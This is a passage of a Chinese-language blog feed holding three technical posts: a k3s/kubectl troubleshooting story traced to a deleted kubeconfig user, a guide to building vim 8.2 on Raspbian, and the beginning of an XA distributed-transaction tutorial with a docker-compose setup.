&lt;p>今天（周一）来公司之后调了下gitlab-ci，给一个前端项目做持续部署。因为前端对kubernetes这套不熟悉，也没有相关的服务器权限，总之就是很难让他们自己来。但是产品部门又喜欢提那种“按钮移到右上角”、“加个图片”之类的需求（对，我司还没有需求管理系统，开发就是个撸码的无情工具人），前端老是过来找我去部署下环境，就搞得摸鱼都摸不痛快。&lt;/p>
&lt;p>所以，当当当~当~，整一个持续部署呗，反正是个纯前端项目，不用部署配套的后端代码，写个dockerfile再写个helm chart就差不多了，ci调了调构建镜像就完事，不过因为ci部署需要访问集群，所以又改了下&lt;code>.kube/config&lt;/code>，删了之前尝试&lt;code>csr&lt;/code>方式添加用户的时候加多的 user 和 context ，复制了一份挂载到 runner 容器里。&lt;/p>
&lt;p>然后&amp;hellip;&amp;hellip;问题就来了。&lt;/p>
&lt;p>同事忽然告诉我办公室的服务挂了，于是下意识地打出&lt;code>kgp&lt;/code>，卡住。&lt;/p>
&lt;p>等了一会儿，还是卡住。&lt;/p>
&lt;p>又等了一会儿，坐不住了。试了下&lt;code>kubectl cluster-info&lt;/code>，继续卡住。&lt;/p>
&lt;p>开始慌了，想起今天的机器有点卡，先看看 &lt;code>free -h&lt;/code> 有没有内存泄漏之类的问题导致阻塞，结果发现并没有，于是继续看 &lt;code>htop&lt;/code>，cpu使用率也比较正常。再看&lt;code>df -h | grep -vE 'shm|overlay'&lt;/code>，发现硬盘使用率96%（估计硬盘主控想死的心都有了，揪着4%的可用空间想把PE数平均到各个区块恐怕不容易）。&lt;/p>
&lt;p>找到问题后松了口气，十有八九是又出现 evicted 了。二话不说直接 &lt;code>docker system df&lt;/code>，看到30多G的 build cache 顿时惊了，肯定不是go的构建缓存（手动挂载优化了），那就是 node_modules 又立奇功了。node_modules=黑洞果然不是吹的。&lt;/p>
&lt;p>清理完使用率恢复到63%，但依然有种不安感萦绕于心，于是再次尝试&lt;code>kgp&lt;/code>，卡住。&lt;/p>
&lt;p>等了一会儿，喝口水，继续卡着。&lt;/p>
&lt;p>又等了一会儿，淦。&lt;/p>
&lt;p>想了想，&lt;code>journalctl -r -u k3s&lt;/code>看看日志，并没有什么发现，倒是注意到很多&lt;code>linkerd&lt;/code>之类的我们部门经理搞事的时候遗留下来的玩意儿在报错，service mesh 我不熟，但寻思应该不会影响 kubectl 吧，k3s 本体的 api-server 应该不归 linkerd 管。更何况 linkerd 本身就没配好。再翻了翻看到下面的内容。&lt;/p>
&lt;pre>&lt;code class="language-log" data-lang="log"> 6 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.685149 794 container_gc.go:85] attempting to delete unused containers
7 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.687723 794 image_gc_manager.go:321] attempting to delete unused images
8 12月 25 21:16:07 office k3s[794]: I1225 13:16:07.782390 794 eviction_manager.go:351] eviction manager: able to reduce ephemeral-storage pressure without evicting pods.
9 12月 25 21:16:17 office k3s[794]: W1225 13:16:17.939242 794 eviction_manager.go:344] eviction manager: attempting to reclaim ephemeral-storage
10 12月 25 21:16:17 office k3s[794]: I1225 13:16:17.939267 794 container_gc.go:85] attempting to delete unused containers
11 12月 25 21:16:17 office k3s[794]: I1225 13:16:17.941771 794 image_gc_manager.go:321] attempting to delete unused images
12 12月 25 21:16:18 office k3s[794]: I1225 13:16:18.033724 794 eviction_manager.go:351] eviction manager: able to reduce ephemeral-storage pressure without evicting pods.
13 12月 25 21:16:28 office k3s[794]: W1225 13:16:28.214032 794 eviction_manager.go:344] eviction manager: attempting to reclaim ephemeral-storage
&lt;/code>&lt;/pre>&lt;p>这个是老问题了，一直没去研究怎么解决。&lt;/p>
&lt;pre>&lt;code class="language-log" data-lang="log"> 154 12月 25 21:21:55 office k3s[794]: I1225 13:21:55.021937 794 image_gc_manager.go:304] [imageGCManager]: Disk usage on image filesystem is at 95% which is over the high threshold (85%). Trying to free 182 155 12月 25 21:21:55 office k3s[794]: E1225 13:21:55.025140 794 kubelet.go:1292] Image garbage collection failed multiple times in a row: failed to garbage collect required amount of images. Wanted to free
&lt;/code>&lt;/pre>&lt;p>这次搜了下，应该是 &lt;code>docker system prune&lt;/code> 造成 &lt;code>kubelet&lt;/code> 找不到可回收的镜像才报错（猜测），不过依然不能解释为啥 &lt;code>kubectl&lt;/code> 没反应。于是继续翻了会儿日志，搜索错误，但始终没有什么结果。&lt;/p>
&lt;p>但是同事还要干活，没辙了，先重启下服务器吧。群里说了一声要重启了，等了一会儿跑&lt;code>sudo reboot&lt;/code>，重启完连接，继续&lt;code>kgp&lt;/code>，卡住。&lt;/p>
&lt;p>嗯&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>早有预料。&lt;/p>
&lt;p>&lt;code>journalctl -r -u k3s --boot&lt;/code> 看看重启后的日志，发现还是老一套的问题，&lt;code>docker&lt;/code> 手动处理镜像和容器造成的和 kubernetes 的管理机制的冲突，各种找不到镜像或者容器的警告，还有一些错误和trace，但没有一个能解释为什么&lt;code>kubectl&lt;/code>没有反应。。。&lt;/p>
&lt;p>直到在&lt;code>kubectl&lt;/code>的终端里按下了ctrl+c，在顺手&lt;code>clear&lt;/code>之前看到了一行请输入用户名（eng）&amp;hellip;&lt;/p>
&lt;p>警觉。&lt;/p>
&lt;p>忽然想起来，因为 &lt;code>kubectl&lt;/code> 这破玩意儿是没有颜色输出的，用习惯了各种彩色输出的命令行工具，&lt;code>kubectl&lt;/code>就格外不顺眼。所以在发现&lt;code>kubecolors&lt;/code>后，我就直接把&lt;code>kubectl&lt;/code>配置成了&lt;code>kubecolor&lt;/code>的别名。&lt;/p>
&lt;p>所以&amp;hellip;&amp;hellip;难道是&lt;code>kubecolor&lt;/code>的问题？&lt;/p>
&lt;p>&lt;code>whereis kubectl&lt;/code>找到&lt;code>kubectl&lt;/code>的绝对路径之后，尝试手动运行&lt;code>/usr/local/bin/kubectl cluster-info&lt;/code>，再次出现了那个输入用户名的提示，顿时开始怀疑起&lt;code>.kube/config&lt;/code>配置有问题，正好在出现问题之前改过了&lt;code>.kube/config&lt;/code>，这里出问题的嫌疑就很吉尔大。&lt;/p>
&lt;p>于是打开&lt;code>.kube/config&lt;/code>，检查了一下集群的用户配置，发现果然，是我手欠把办公室集群的用户给删了。草。&lt;/p>
&lt;p>急忙从&lt;code>/etc/rancher/k3s/k3s.yaml&lt;/code>复制下用户证书配置，贴进去，再运行&lt;code>kgp&lt;/code>果然屁事没有了。&lt;/p>
&lt;p>所以总结如下。&lt;/p>
&lt;ol>
&lt;li>别被表面的问题迷惑。&lt;/li>
&lt;li>自己犯傻的几率大于基础设施/常用工具犯傻的几率。&lt;/li>
&lt;li>遇到问题解决步骤很重要，准确的方向可以省很多时间。
&lt;ol>
&lt;li>先确定故障表现和复现条件&lt;/li>
&lt;li>确定故障点（出现在网络、网关还是应用、数据库），弄清楚是不是新问题&lt;/li>
&lt;li>再排查相关配置是否正确，回忆是否有做过相关修改变更&lt;/li>
&lt;li>再排查故障点日志，必要的时候参考下代码，毕竟有的时候日志没写清楚错误的上下文&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol></description></item><item><title>在raspbian上手动编译vim8.2</title><link>https://nnnewb.github.io/blog/p/build-vim8.2-manually-on-raspbian/</link><pubDate>Sat, 25 Dec 2021 10:37:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/build-vim8.2-manually-on-raspbian/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>raspbian上自带的vim版本还是低了点，像是&lt;code>coc.nvim&lt;/code>之类的插件弹警告就搞得很烦。我寻思自己编译一个吧。&lt;/p>
&lt;h2 id="0x01-下载源码">0x01 下载源码&lt;/h2>
&lt;p>从&lt;a class="link" href="https://www.vim.org/download.php" target="_blank" rel="noopener"
>vim官网&lt;/a>下载源码（或者可以从GitHub下，出于网络考虑还是直接从ftp下了），下完直接&lt;code>scp&lt;/code>传到树莓派上，&lt;code>tar xf&lt;/code>解压好准备开整。&lt;/p>
&lt;h2 id="0x02-配置">0x02 配置&lt;/h2>
&lt;p>惯例先看看文档，&lt;code>README.md&lt;/code>里指出源码安装去看&lt;code>src/INSTALL&lt;/code>，所以跟着去看。&lt;/p>
&lt;p>在 Unix 一节中提到直接&lt;code>make&lt;/code>+&lt;code>make install&lt;/code>就完事，但我要的不是编译个默认版本的vim，毕竟还有插件会用到&lt;code>vim&lt;/code>的 &lt;code>Pyhon&lt;/code>/&lt;code>Python3&lt;/code> 特性，比如&lt;code>ycm&lt;/code>。&lt;/p>
&lt;p>继续往下翻会看到编译依赖。&lt;/p>
&lt;pre>&lt;code>% sudo apt install git
% sudo apt install make
% sudo apt install clang
% sudo apt install libtool-bin
&lt;/code>&lt;/pre>
&lt;p>跟着把依赖装好，clang估计是可选项，gcc肯定是能编译vim的。不过以防万一反正全装上。&lt;/p>
&lt;p>后面终于看到了Python3添加支持的方式。&lt;/p>
&lt;pre>&lt;code>Add Python 3 support:
% sudo apt install libpython3-dev
Uncomment this line in Makefile:
&amp;quot;CONF_OPT_PYTHON3 = --enable-python3interp&amp;quot;
% make reconfig
&lt;/code>&lt;/pre>
&lt;p>虽然说文档让取消注释，但是我不想改东西。所以记一下&lt;code>--enable-python3interp&lt;/code>，等会儿加入&lt;code>configure&lt;/code>的参数。&lt;/p>
&lt;p>后面又有个关于gui的，因为不使用gui，所以也记一下。&lt;/p>
&lt;blockquote>
&lt;p>Unix: COMPILING WITH/WITHOUT GUI&lt;/p>
&lt;p>NOTE: This is incomplete, look in Makefile for more info.&lt;/p>
&lt;p>These configure arguments can be used to select which GUI to use:&lt;/p>
&lt;pre>&lt;code>--enable-gui=gtk or: gtk2, motif, athena or auto
--disable-gtk-check
--disable-motif-check
--disable-athena-check
&lt;/code>&lt;/pre>&lt;p>This configure argument can be used to disable the GUI, even when the necessary
files are found:&lt;/p>
&lt;pre>&lt;code>--disable-gui
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>到时候&lt;code>--disable-gui&lt;/code>可以省一点编译时间，虽然本来也没多少编译时间。树莓派性能不是很好，tf卡读写寿命也有限，省一点是一点咯。&lt;/p>
&lt;p>还有个&lt;code>--with-features=big&lt;/code>，实际参考&lt;a class="link" href="http://www.drchip.org/astronaut/vim/vimfeat.html" target="_blank" rel="noopener"
>vim&amp;rsquo;s versions and features&lt;/a>，还是用&lt;code>huge&lt;/code>，因为看起来功能比较全。&lt;/p>
&lt;p>再加上参数&lt;code>--enable-multibyte&lt;/code>和&lt;code>--enable-cscope&lt;/code>就差不多了。再加上必要的一些依赖库。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo apt install -y libpython-dev libpython3-dev libperl-dev libncurses-dev
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-编译">0x03 编译&lt;/h2>
&lt;p>按照&lt;code>autoconf&lt;/code>这套编译系统的常规套路，先运行&lt;code>./configure&lt;/code>，带上之前考虑好的参数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">./configure &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --prefix&lt;span class="o">=&lt;/span>/usr/local/ &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --with-features&lt;span class="o">=&lt;/span>huge &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --enable-multibyte &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --disable-gui &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --enable-pythoninterp &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --enable-python3interp &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --enable-perlinterp &lt;span class="se">\
&lt;/span>&lt;span class="se">&lt;/span> --enable-cscope
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">make
sudo make install
&lt;/code>&lt;/pre>&lt;/div>&lt;p>等编译完成。&lt;/p>
&lt;h2 id="0x04-设置默认编辑器">0x04 设置默认编辑器&lt;/h2>
&lt;p>用&lt;code>update-alternatives&lt;/code>配置默认编辑器，或者在&lt;code>.zshrc&lt;/code>里加上&lt;code>alias vim=/usr/local/bin/vim&lt;/code>也是可以的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo update-alternatives --install /usr/bin/editor editor /usr/local/bin/vim &lt;span class="m">1&lt;/span>
sudo update-alternatives --set editor /usr/local/bin/vim
sudo update-alternatives --install /usr/bin/vi vi /usr/local/bin/vim &lt;span class="m">1&lt;/span>
sudo update-alternatives --set vi /usr/local/bin/vim
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>vim的编译这么简单应该把功劳算到良好的架构上，功能开关这种东西是要架构清晰地给组件之间划出边界的。&lt;/p>
&lt;p>很多杂鱼公司根本不考虑系统维护，所谓的 &lt;strong>创造价值&lt;/strong> 就是以最快的速度 &lt;strong>应付需求&lt;/strong> ，想起几年前的自己还真的是天真，以为软件从业起码是有点基本的素养的，起码工程能力是有的。现在我的想法变了，软件从业不是有手就行？产品最想要的就是直接把别家的软件 &lt;em>copy&amp;amp;paste&lt;/em> 成自己的，我寻思做软件键盘上磨损最快的就是 &lt;code>ctrl&lt;/code> &lt;code>c&lt;/code> &lt;code>v&lt;/code>这三个键了。&lt;/p>
&lt;p>产品嘛。什么工程性？什么可维护？那跟我有什么关系，反正改需求的dead line是码农的，修bug是码农修，我产品设计要与时俱进，要紧随市场，要服务客户，你就是个写代码的，这也不做那也不做雇你来干什么？&lt;/p>
&lt;p>平常心平常心，扯远了。&lt;/p>
&lt;p>总之，vim，好软件。顺便记得关注下乌干达儿童生存状况（不扯政治地说，vim自称慈善软件(charityware)还是有点东西的，再说下去鲁迅先生就要出来赶苍蝇了）。&lt;/p></description></item><item><title>XA 事务从理论到实践</title><link>https://nnnewb.github.io/blog/p/xa-transaction-theory-to-practice/</link><pubDate>Thu, 16 Dec 2021 15:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/xa-transaction-theory-to-practice/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>有言道，纸上得来终觉浅，绝知此事要躬行。分布式事务的具体方案，看几篇文章就基本有了概念，但实际应用的机会很少。这不有点闲暇，就试试看把理论化作代码，在实践中检验。&lt;/p>
&lt;h2 id="1-案例设计">#1 案例设计&lt;/h2>
&lt;p>采用分布式事务经典的转账案例：用户从银行A转账到银行B，银行A扣除余额，银行B增加余额。&lt;/p>
&lt;p>XA事务官方规范文档给出的示意图如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/%E4%BA%8B%E5%8A%A1%E6%A8%A1%E5%9E%8B-16396188786822.webp"
loading="lazy"
alt="事务模型"
>&lt;/p>
&lt;p>用 XA 事务描述，用户的转账操作发生在AP，AP调用TM注册全局事务后，调用银行A（RM）完成扣款（PREPARE），调用银行B（RM）完成增加余额（PREPARE），然后调用TM提交全局事务，TM回调银行A和B提交本地事务。&lt;/p>
&lt;p>图示如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216093842362-16396187268731.png"
width="975"
height="755"
srcset="https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216093842362-16396187268731_hud4880bf67613c24d16e213b564201e7c_46081_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216093842362-16396187268731_hud4880bf67613c24d16e213b564201e7c_46081_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="xa事务时序图"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="309px"
>&lt;/p>
&lt;p>上面的时序图是读了 &lt;a class="link" href="https://github.com/yedf/dtm/" target="_blank" rel="noopener"
>github.com/yedf/dtm&lt;/a> 代码后胡乱分析出来的，图略去了错误处理的部分。根据这个时序图可以做出一个简单的服务划分设计。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216095721213.png"
width="634"
height="574"
srcset="https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216095721213_hucf2754a53d93ba8eebe14a4b22b7b5b1_40377_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/xa-transaction-theory-to-practice/image-20211216095721213_hucf2754a53d93ba8eebe14a4b22b7b5b1_40377_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="案例服务划分"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="265px"
>&lt;/p>
&lt;p>为了更好地观察服务的交互情况，引入了 Jaeger ，如果是为了简化整个案例代码考虑也可以不要。但大部分时候 Jaeger 应该是没什么存在感的。&lt;/p>
&lt;p>nginx 反向代理将 AP 的接口还有 Bank1/Bank2的接口导出给用户访问，实际上案例中没有需要访问 Bank1/Bank2 接口的情况，所以 去掉 nginx 反向代理应该也没什么大关系。&lt;/p>
&lt;h2 id="2-技术栈">#2 技术栈&lt;/h2>
&lt;p>所有服务使用docker-compose部署，kubernetes也没问题。&lt;/p>
&lt;p>MySQL使用5.7版本，jaeger和nginx最新稳定版。AP/Bank服务都使用 Go 语言编写， 使用 Gin 作为 HTTP 服务框架，OpenTelemetry 跟踪，sqlx 做 ORM。&lt;/p>
&lt;h2 id="3-接口设计">#3 接口设计&lt;/h2>
&lt;p>接口url设计有参考 Google APIs 规范，但并不是硬套 RESTful 。&lt;/p>
&lt;p>AP服务提供接口&lt;/p>
&lt;ul>
&lt;li>&lt;code>/v1alpha1/transfer&lt;/code> 转账接口&lt;/li>
&lt;/ul>
&lt;p>Bank服务提供接口&lt;/p>
&lt;ul>
&lt;li>&lt;code>/v1alpha1/trans_in&lt;/code> 余额转入&lt;/li>
&lt;li>&lt;code>/v1alpha1/trans_out&lt;/code> 余额转出&lt;/li>
&lt;li>&lt;code>/v1alpha1/tm_callback&lt;/code> 事务回调，当AP提交事务或者回滚时，TM回调这个接口并告知需要提交还是回滚&lt;/li>
&lt;/ul>
&lt;p>TM服务提供接口&lt;/p>
&lt;ul>
&lt;li>&lt;code>/v1alpha1/create_global_tx&lt;/code> 注册全局事务。&lt;/li>
&lt;li>&lt;code>/v1alpha1/register_local_tx&lt;/code> 注册本地事务，指定关联哪个全局事务。在AP提交或者回滚的时候TM可以查找出所有本地事务并回调。&lt;/li>
&lt;li>&lt;code>/v1alpha1/commit_global_tx&lt;/code> 提交全局事务。&lt;/li>
&lt;li>&lt;code>/v1alpha1/rollback_global_tx&lt;/code> 回滚全局事务。&lt;/li>
&lt;/ul>
&lt;p>一共需要实现8个接口，接口会尽量简化。&lt;/p>
&lt;h2 id="4-框架构建">#4 框架构建&lt;/h2>
&lt;p>创建好各个服务的样板（就是简单的用Gin把上面的接口定义好，写好主程序），接着写 Dockerfile 和 docker-compose.yml 把之前设计的服务划分实现出来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;3.1&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">services&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">jaeger&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaegertracing/all-in-one:1.29&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">COLLECTOR_ZIPKIN_HOST_PORT=:9411&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">expose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5775&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">6831&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">6832&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5778&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">16686&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">14268&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">14250&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">9411&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">16686&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">16686&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">mysql&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">mysql:5.7&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s2">&amp;#34;3306:3306&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">environment&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">MYSQL_ROOT_PASSWORD&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">root&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">./scripts/initdb.d/:/docker-entrypoint-initdb.d/:ro&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">reverseproxy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">nginx:mainline&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">8080&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="m">80&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bank1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bank2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">app&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">./scripts/nginx/default.conf:/etc/nginx/conf.d/default.conf:ro&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">tm&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">context&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">dockerfile&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">docker/tm.Dockerfile&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">expose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5000&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">bank1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">context&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">dockerfile&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">docker/bank.Dockerfile&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">command&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;/bank&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;-bank-id&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">expose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5000&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">tm&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">bank2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">context&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">dockerfile&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">docker/bank.Dockerfile&lt;/span>&lt;span class="w">
